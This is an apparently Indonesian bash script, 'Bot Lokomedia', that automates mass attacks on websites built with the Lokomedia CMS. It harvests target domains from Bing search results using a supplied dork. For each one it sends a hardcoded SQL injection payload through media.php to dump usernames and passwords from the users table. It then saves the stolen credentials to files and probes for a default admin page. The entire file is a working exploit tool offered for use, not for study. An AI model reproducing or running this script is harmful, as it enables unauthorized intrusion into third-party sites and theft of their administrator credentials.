#!/bin/bash

# c0ded by : shutdown57
# powered by www.alinko.jp

# COLOR | WARNA
m="\e[0;31m" # merah
k="\e[0;33m" # kuning
h="\e[0;32m" # hijau
b="\e[0;34m" # biru
lm="\e[1;31m" # merah terang
lk="\e[1;33m" # kuning terang
lh="\e[1;32m" # hijau terang
lb="\e[1;34m" # biru terang seterang masa depan kita.
n="\e[0m" # clear / netral
w="\e[1;37m" # putih tebal


xSimpanPacar(){
	touch $2
	chmod 777 $2
	echo $1 >> $2
}
xSimpanan(){
	mkdir OutputxS57 > /dev/null 2>&1
	chmod 777 OutputxS57
	touch OutputxS57/readme.txt
	echo "-[ shutdown57 ]-" > OutputxS57/readme.txt
	local uvuv=$(date +"%H%m%s")
	local name="OutputxS57/$uvuv-$1.txt"
	touch $name
	echo "+-[ INFO ]-+" >> $name
	echo "Site : $1 " >> $name
	echo $2 >> $name
	echo "+-[ END  ]-+" >> $name
	local cekfile=$(cat $name)
	if [[ -f $name && $cekfile != "" ]]; then
		xS57s " Result saved to : $name !"
	else
		xS57f " Failed Save Result :("
		echo $2
		echo "-----------------------"
	fi
}
bingDork(){
	local curl=`curl "http://www.bing.com/search?q=${2}&first=${1}1" -s`
	local gets=$(echo $curl | grep -Po "(?<=<h2><a href=\")[^\"]*")
	xS57i "-[ INFO ]-"
	xS57i "Dork : "$2
	xS57i "Page : "$1
	xS57i "R u n n i n g . . . ."
	for geturl in $gets
	do
		IFS="/" read -r -a url <<< "$geturl"
		xS57s ${url[2]}
		xSimpanPacar ${url[2]} $3
	done
}
FindAdminLokmed(){
	local adminpage="adminweb/"
	local ceklo=$(curl -s --connect-timeout 10 ${1}/$adminpage -D -)
	if [[ $ceklo =~ "200 OK" ]]; then
		xS57s "Found Default Adminpage : ${1}/$adminpage !"
	else
		xS57d "Not Found Default Adminpage :( ."
	fi
}
ExploitX(){
	injectable="/media.php?module=detailberita&id=.169+'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,username,0x3a574f533a,password,0x3c62723e)),@)--+"
	buaturi="${1}/${injectable}"
	cekhead=$(curl -s $buaturi --head)
	xS57i "I n j e c t i n g . . ."
	if [[ $cekhead =~ "200" ]]; then
		curl -s $buaturi | grep "WOS" > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			xS57s "${1} -> INJECTED !"
			up=$(curl -s "${buaturi}" | grep -Po "(\#.*:WOS:.*\#)" | sed -e 's/:WOS:/Username:Password/g')
			xS57i "Getting Username & Password . . ."
			xSimpanan $1 $up
			xSimpanPacar $buaturi "result.txt"
			xS57i "Trying Find Default adminpage . . ."
			FindAdminLokmed $1
		else
			xS57d "${buaturi} -> FAILED"
		fi
	else
		xS57f "${1} -> ERROR ! | Detected WAF"
	fi
}
xS57i(){
	echo -e "${lb}[i] ${n} ${1}" 
}
xS57t(){
	echo -e -n "${h}[?] ${n} ${1}"
	read $2
}
xS57f(){
	echo -e "${lm}[!] ${n} ${1}"
}
xS57d(){
	echo -e "${k}[!] ${n} ${1}"
}
xS57s(){
	echo -e "${lh}[+] ${n} ${1} "
}
InjectLokmed(){
	listsite=`cat $1`
	site=$(echo $listsite | tr "\n" "\n")
	for si in $site
	do
		xS57i "Checking ${si}/media.php?module=home for Exploit ..."
		local cek=$(curl -s --connect-timeout 10 ${si}/media.php?module=home -D -)
		if [[ $cek =~ "HTTP/1.1 200 OK" ]]; then
			xS57s "${si}/media.php?module=home -> 200 OK !"
			ExploitX $si
		else
			xS57d "${si}/media.php?module=home -> Not Vuln !"
		fi
	done
}

BannerxS57(){
	clear
printf "${lk}                               
                                          ${lh}  *${lk}
                                          ${lh} * *${lk}       
     _       _     _               ___ ___${lh}* * *${lk}
 ___| |_ _ _| |_ _| |___ _ _ _ ___|  _|_  |${n} |${lk}
|_ -|   | | |  _| . | . | | | |   |_  | | |${n} |${lk}
|___|_|_|___|_| |___|___|_____|_|_|___| |_|${n} |${lh}
x-------------------------------------------X${n}
 X${lb} Bot Lokomedia xXx copyright (c) 2017${n} XxXx
  x-|${lm} powered by${w} www.alinko.jp ${n}|----------X
"
}
if [[ $1 == "" && $2 == "" && $3 == "" ]]; then
	BannerxS57
	printf "
Cara Menggunakan :
  $0 <dork> <NumPage> <SaveAs>
Contoh Penggunaan :
  $0 'semua-berita.html' '10' 'result.txt'

"
else
	BannerxS57
	for (( i = 0; i < $2; i++ )); do
		bingDork $i $1 $3 | tee -a BotLokomedia.log
	done
	InjectLokmed $3 | tee -a BotLokomedia.log
fi
